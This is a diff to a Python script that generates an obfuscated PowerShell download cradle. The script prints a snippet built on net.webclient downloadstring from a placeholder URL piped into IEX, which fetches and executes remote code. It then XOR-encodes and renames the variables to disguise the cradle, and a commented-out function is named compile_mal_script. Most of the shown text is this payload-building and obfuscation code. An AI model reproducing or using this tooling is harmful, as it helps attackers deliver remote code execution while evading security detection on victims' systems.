@@ -8,13 +8,14 @@ import random
 import string
 
 print('''	
-Power$hell Code Routine:
-$var1 = '(new-object net.webclient).'
-$var2 = 'downloadstring'
+################# Power$hell Code Routine we'd like to run  ####################
+$var1 = "(new-object net.webclient)."
+$var2 = "downloadstring"
 $var3 = "('http://127.0.0.1:9999/test.ps1')"
 
 $boom =  $var1 + $var2 + $var3
-$boomboom = $boom | IEX
+$boomboom =  IEX $boom
+
 $boomboom | IEX
 ''')
 # Define the XOR key
@@ -58,14 +59,16 @@ for var_name, var_value in variables_dict.items():
         # # Print a message showing the original variable name and its encrypted name
         #print(f"Variable '{var_name}' encrypted '{new_var_name}'.")
 
-print('################################################################################')
+print('#################    First Iteration, Change the Cradle     ####################')
 # # Print the values of the variables with their encrypted names
 for var_name, var_value in new_vars_dict.items():
     print(f"{var_name} = {var_value}")
 
 print('''
 The last 2 Variables are place holders....I'm converting them now.
-################################################################################''')
+
+
+#################    Final Iteration, Here's the Code       ####################''')
 #def compile_mal_script(new_vars_dict):
 
 new_list = list(new_vars_dict)
